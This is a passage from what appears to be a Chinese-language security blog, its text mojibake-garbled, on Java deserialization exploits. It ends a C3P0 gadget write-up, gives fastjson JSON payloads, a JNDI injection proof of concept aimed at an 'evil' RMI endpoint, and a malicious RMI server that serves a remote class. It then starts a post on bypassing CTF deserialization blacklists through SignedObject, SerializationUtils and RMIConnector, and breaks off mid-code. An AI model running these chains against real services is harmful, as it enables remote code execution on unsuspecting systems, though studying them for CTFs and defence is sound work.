(sTemp.length() &lt; <span class="hljs-number">2</span>) &#123;<br>                sb.append(<span class="hljs-number">0</span>);<br>            &#125;<br><br>            sb.append(sTemp.toUpperCase());<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é…åˆfastjsonä½¿ç”¨ï¼š</p><blockquote><p>{ â€œaâ€: { â€œ@typeâ€: â€œjava.lang.Classâ€, â€œvalâ€: â€œcom.mchange.v2.c3p0.WrapperConnectionPoolDataSourceâ€ }, â€œbâ€: { â€œ@typeâ€: â€œcom.mchange.v2.c3p0.WrapperConnectionPoolDataSourceâ€, â€œuserOverridesAsStringâ€: â€œHexAsciiSerializedMap:hexEXP;â€ } }</p></blockquote><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>æ²¡é”™ï¼Œè¿˜èƒ½é…JNDIã€‚ä½†æœ‰ç‰ˆæœ¬é™åˆ¶ã€‚</p><p>ä¹Ÿæ˜¯åœ¨fastjsonæˆ–jacksonç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œjdk8u191ä»¥ä¸‹ï¼ˆæ”¯æŒLDAP-JNDIæ³¨å…¥ï¼‰</p><ul><li><code>JndiRefConnectionPoolDataSource#setJndiName</code>æœ€åä¼šè°ƒç”¨<code>JndiRefDataSourceBase#setJndiName</code>ï¼Œè®¾ç½®<code>JndiRefDataSourceBase</code>ç±»çš„jndiNameå±æ€§ã€‚</li><li><code>JndiRefConnectionPoolDataSource#setLoginTimeout</code> &#x3D;&gt;<code>WrapperConnectionPoolDataSource#setLoginTimeout</code> &#x3D;&gt; <code>JndiRefForwardingDataSource#setLoginTimeout</code> &#x3D;&gt; <code>inner()</code> &#x3D;&gt; <code>dereference()</code></li></ul><p><code>JndiRefForwardingDataSource</code>ç»§æ‰¿è‡ª<code>JndiRefDataSourceBase</code>ï¼Œå¯è·å–å…¶jndiName</p><p><img src="/2024/08/05/C3P0/image-20240805000416111.png" alt="image-20240805000416111"></p><h4 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">JndiRefConnectionPoolDataSource</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JndiRefConnectionPoolDataSource</span>();<br>    exp.setJndiName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>);<br>    exp.setLoginTimeout(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>RMIServerï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, url);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        r.bind(<span class="hljs-string">&quot;evil&quot;</span>,referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>calc.classæŒ‚webæœåŠ¡ï¼Œ<code>python -m http.server 8080</code></p><p><img src="/2024/08/05/C3P0/image-20240805000514530.png" alt="image-20240805000514530"></p><p>é…åˆfastjsonä½¿ç”¨</p><blockquote><p>{ â€œaâ€:{ â€œ@typeâ€:â€java.lang.Classâ€, â€œvalâ€:â€com.mchange.v2.c3p0.JndiRefForwardingDataSourceâ€ }, â€œbâ€:{ â€œ@typeâ€:â€com.mchange.v2.c3p0.JndiRefForwardingDataSourceâ€, â€œjndiNameâ€:â€rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;evilâ€, â€œloginTimeoutâ€:0 } }</p></blockquote><p>åœ¨fastjsonï¼Œjacksonç­‰ç¯å¢ƒä¸‹ï¼Œè°ƒç”¨JndiRefConnectionPoolDataSourceç±»çš„jndinameï¼Œlogintimeoutå±æ€§setteræ–¹æ³•ï¼Œå‘jndinameä¼ å…¥æ¶æ„RMIæœåŠ¡å™¨åœ°å€ï¼Œç„¶åè°ƒç”¨logintimeoutçš„setteræ–¹æ³•ä½¿å—å®³æœºå»lookupè®¾ç½®å¥½çš„jndinameä¸­çš„æ¶æ„åœ°å€ï¼Œé€ æˆJNDIæ³¨å…¥ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/c3p0">C3P0 | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äºŒæ¬¡ååºåˆ—åŒ–</title>
    <link href="/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/08/04/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å¾ˆå¤šjavaé¢˜ç›®ï¼Œå¤§éƒ½å¼„äº†ä¸ªç±»ç»§æ‰¿<code>ObjectInputStream</code>ï¼Œé‡å†™å…¶<code>resolveClass</code>æ–¹æ³•ï¼Œåœ¨é‡Œé¢æ·»åŠ å¯¹ååºåˆ—åŒ–ç±»é»‘åå•çš„æ ¡éªŒã€‚è¿™ä¹Ÿä¸ºæˆ‘AWDPä¿®javaé¢˜æä¾›äº†ä¸€äº›æ€è·¯ã€‚</p><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>           <span class="hljs-string">&quot;java\\.security.*&quot;</span>, <span class="hljs-string">&quot;java\\.rmi.*&quot;</span>,  <span class="hljs-string">&quot;com\\.fasterxml.*&quot;</span>, <span class="hljs-string">&quot;com\\.ctf\\.*&quot;</span>,<br>           <span class="hljs-string">&quot;org\\.springframework.*&quot;</span>, <span class="hljs-string">&quot;org\\.yaml.*&quot;</span>, <span class="hljs-string">&quot;javax\\.management\\.remote.*&quot;</span><br>   &#125;;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>      <span class="hljs-built_in">super</span>(inputStream);<br>   &#125;<br><br>   <span class="hljs-keyword">protected</span> Class <span class="hljs-title function_">resolveClass</span><span class="hljs-params">(ObjectStreamClass cls)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>      <span class="hljs-keyword">if</span>(!contains(cls.getName())) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(cls);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unexpected serialized class&quot;</span>, cls.getName());<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(String targetValue)</span> &#123;<br>      <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;<br>         <span class="hljs-keyword">if</span> (targetValue.matches(forbiddenPackage))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è¿™ç§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyownObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">ArrayList</span> <span class="hljs-variable">Blacklist</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyownObjectInputStream</span><span class="hljs-params">(InputStream in)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(in);<br>        <span class="hljs-built_in">this</span>.Blacklist.add(Hashtable.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HashSet.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(JdbcRowSetImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TreeMap.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(HotSwappableTargetSource.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(XString.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(BadAttributeValueExpException.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(TemplatesImpl.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(ToStringBean.class.getName());<br>        <span class="hljs-built_in">this</span>.Blacklist.add(<span class="hljs-string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.Blacklist.contains(desc.getName())) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;dont do this&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™äº›é»‘åå•ä¸­çš„ç±»åœ¨ååºåˆ—åŒ–ä¸­å½“ç„¶æ˜¯å¾ˆæœ‰ç”¨é€”çš„ã€‚</p><p>ä½†æ˜¯åœ¨æ¯”èµ›åšé¢˜çš„æ—¶å€™å°±å¾ˆçƒ¦äº†ï¼Œè‹¥æ²¡æœ‰ç§¯ç´¯å……è¶³çš„Javaååºåˆ—åŒ–åˆ©ç”¨é“¾ç»éªŒï¼Œå¾ˆéš¾ç»•ã€‚è€Œä¸”æ¯”èµ›æ—¶ä¸´æ—¶å»æ‰¾è§¦å‘ç±»ä¹ŸæŒºéš¾çš„ã€‚å°¤å…¶æ˜¯æ–­ç½‘çš„çº¿ä¸‹ç¯å¢ƒæ›´æ˜¯æŠ½è±¡ï¼Œç§ç§åŸå› ç”šè‡³ä½¿å¾—webé¢˜ç›®é‡ŒJavaååºåˆ—åŒ–åšå‡ºæ¥çš„è‚¯å®šæ˜¯æœ€å°‘çš„äººã€‚</p><p>Javaé¢˜å°±å˜æˆä¸€é“ç±»çš„æ’åˆ—ç»„åˆç¼åˆæ€ªäº†ğŸ¤¯ï¼Œæƒ³åŠæ³•ç¼å‡ºä¸€æ¡å¯ä»¥æ‰“é€šçš„åœ¨é»‘åå•ä¹‹å¤–çš„åˆ©ç”¨é“¾ã€‚</p><p>è¿™æ—¶å€™å°±å¯ä»¥è€ƒè™‘ä¸€ä¸‹äºŒæ¬¡ååºåˆ—åŒ–äº†ï¼Œä¸ç”¨ä½ å®šä¹‰çš„æ£€æµ‹é»‘åå•çš„<code>ObjectInputStream</code>å»åŠ è½½åºåˆ—åŒ–å¯¹è±¡ï¼Œè€Œæ˜¯æ‰¾åˆ°ä¸€æ¡å¯ä»¥è§¦å‘<code>readObject</code>çš„é“¾å­ï¼Œç”¨åŸç”Ÿçš„<code>ObjectInputStream</code>å»<code>resolveClass</code></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><p>é‡åˆ°è¿‡ä¸”å®æ“è¿‡ä¸¤æ¬¡çš„å¥½ä¸œè¥¿ã€‚</p><p>å…³é”®åœ¨äº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java.security.SignedObject#getObject<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»åœ¨<code>Hessian</code>ååºåˆ—åŒ–ä¸­ä¹Ÿç”¨è¿‡ï¼ˆHessiançš„ä¼šæ”¾åœ¨åé¢å†æ›´ï¼‰ï¼Œç”±äº<code>Hessian</code>ååºåˆ—åŒ–çš„ç‰¹æ®Šæ€§ï¼Œä¸ä¼šæ‰§è¡Œç±»çš„<code>readObject</code>æ¥ååºåˆ—åŒ–ï¼Œè€Œæ˜¯é€šè¿‡åå°„è·å–<code>field</code>å†å¡«å……è¿›ä¸€ä¸ªç©ºçš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œ<code>_tfactory</code>åˆæ˜¯<code>transient</code>ä¿®é¥°ï¼Œ<code>writeObject</code>ä¸ä¼šå†™è¿›å»ï¼Œå¯¼è‡´<code>TemplatesImpl</code>ä¸èƒ½åˆ©ç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SignedObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">SignedObject</span><span class="hljs-params">(Serializable object, PrivateKey signingKey,</span><br><span class="hljs-params">                        Signature signingEngine)</span><br>        <span class="hljs-keyword">throws</span> IOException, InvalidKeyException, SignatureException &#123;<br>            <span class="hljs-comment">// creating a stream pipe-line, from a to b</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(b);<br><br>            <span class="hljs-comment">// write and flush the object content to byte array</span><br>            a.writeObject(object);<br>            a.flush();<br>            a.close();<br>            <span class="hljs-built_in">this</span>.content = b.toByteArray();<br>            b.close();<br><br>            <span class="hljs-comment">// now sign the encapsulated object</span><br>            <span class="hljs-built_in">this</span>.sign(signingKey, signingEngine);<br>    &#125;<br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// creating a stream pipe-line, from b to a</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(<span class="hljs-built_in">this</span>.content);<br>        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(b);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> a.readObject();<br>        b.close();<br>        a.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§¦å‘æ–¹å¼ï¼šèƒ½å¤Ÿæ‰§è¡Œç±»çš„<code>getter</code>æ–¹æ³•ï¼Œæ¯”å¦‚é…åˆ<code>ROME</code>æˆ–<code>FastJson</code>æ‰“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">KeyPairGenerator keyPairGenerator;<br>keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br><br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(object_with_evil_readObject, privateKey, signingEngine);<br></code></pre></td></tr></table></figure><h2 id="SerializationUtils"><a href="#SerializationUtils" class="headerlink" title="SerializationUtils"></a>SerializationUtils</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.util.SerializationUtils.deserialize<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> <span class="hljs-type">byte</span>[] bytes)</span> &#123;<br>    <span class="hljs-keyword">if</span> (bytes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes))) &#123;<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125; <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.management.remote.rmi.RMIConnector#findRMIServerJRMP<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServerJRMP</span><span class="hljs-params">(String base64, Map&lt;String, ?&gt; env, <span class="hljs-type">boolean</span> isIiop)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] serialized;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serialized = base64ToByteArray(base64);<br>    &#125; <span class="hljs-comment">//....</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serialized);<br><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> EnvHelp.resolveClientClassLoader(env);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">oin</span> <span class="hljs-operator">=</span><br>        (loader == <span class="hljs-literal">null</span>) ?<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bin) :<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStreamWithLoader</span>(bin, loader);<br>    <span class="hljs-keyword">final</span> Object stub;<br>    <span class="hljs-keyword">try</span> &#123;<br>        stub = oin.readObject();<br>    &#125; <span class="hljs-comment">// ....</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è‹¥èƒ½æ§åˆ¶base64å‚æ•°çš„å†…å®¹å°±å¯ä»¥ä»»æ„ååºåˆ—åŒ–ã€‚</p><p>å¾€ä¸Šå›æº¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RMIServer <span class="hljs-title function_">findRMIServer</span><span class="hljs-params">(JMXServiceURL directoryURL,</span><br><span class="hljs-params">                                Map&lt;String, Object&gt; environment)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isIiop</span> <span class="hljs-operator">=</span> RMIConnectorServer.isIiopURL(directoryURL,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (isIiop) &#123;<br>        <span class="hljs-comment">// Make sure java.naming.corba.orb is in the Map.</span><br>        environment.put(EnvHelp.DEFAULT_ORB,resolveOrb(environment));<br>    &#125;<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> directoryURL.getURLPath();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> path.indexOf(<span class="hljs-string">&#x27;;&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (end &lt; <span class="hljs-number">0</span>) end = path.length();<br>    <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/jndi/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJNDI(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/stub/&quot;</span>))<br>        <span class="hljs-keyword">return</span> findRMIServerJRMP(path.substring(<span class="hljs-number">6</span>,end), environment, isIiop);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (path.startsWith(<span class="hljs-string">&quot;/ior/&quot;</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!IIOPHelper.isAvailable())<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;iiop protocol not available&quot;</span>);<br>        <span class="hljs-keyword">return</span> findRMIServerIIOP(path.substring(<span class="hljs-number">5</span>,end), environment, isIiop);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;URL path must begin with /jndi/ or /stub/ &quot;</span> +<br>            <span class="hljs-string">&quot;or /ior/: &quot;</span> + path;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MalformedURLException</span>(msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>path</code>ä»¥<code>/stub/</code>å¼€å¤´å°±èƒ½è¿›åˆ°<code>findRMIServerJRMP</code>ï¼Œ<code>path</code>ä¸­<code>/stub/</code>ä¸ºåºåˆ—åŒ–å­—èŠ‚çš„base64ç¼–ç </p><p><code>path</code>ç”±<code>directoryURL#getURLPath</code>å¾—åˆ°</p><p>åœ¨å¾€ä¸Šå‘ç°<code>connect</code>å’Œ<code>doStart</code>è°ƒç”¨äº†<code>findRMIServer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 